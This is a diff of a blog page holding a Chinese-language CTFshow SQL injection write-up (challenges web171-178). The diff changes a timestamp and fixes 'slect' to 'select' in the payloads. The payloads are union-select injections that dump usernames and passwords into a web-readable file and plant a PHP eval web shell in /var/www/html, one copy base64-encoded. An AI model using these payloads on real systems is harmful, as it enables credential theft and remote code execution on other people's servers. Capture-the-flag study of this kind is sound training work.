@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401131417799.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401131454209.png">
 <meta property="article:published_time" content="2025-03-31T04:32:32.000Z">
-<meta property="article:modified_time" content="2025-04-03T05:39:26.651Z">
+<meta property="article:modified_time" content="2025-04-04T16:18:28.292Z">
 <meta property="article:author" content="Y0ungK1ng">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -218,7 +218,7 @@
 <p>将数据输出到一个文件中，然后访问对应文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select  username,password from ctfshow_user5 into outfile &quot;/var/www/html/1.txt&quot;--+</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union slect 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php</span><br><span class="line">-1&#x27; union slect 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#x27;/var/www/html/1.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php</span><br><span class="line">-1&#x27; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#x27;/var/www/html/1.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 <p><img src="/2025/03/31/web171-178/file-20250401130210172.png"></p>
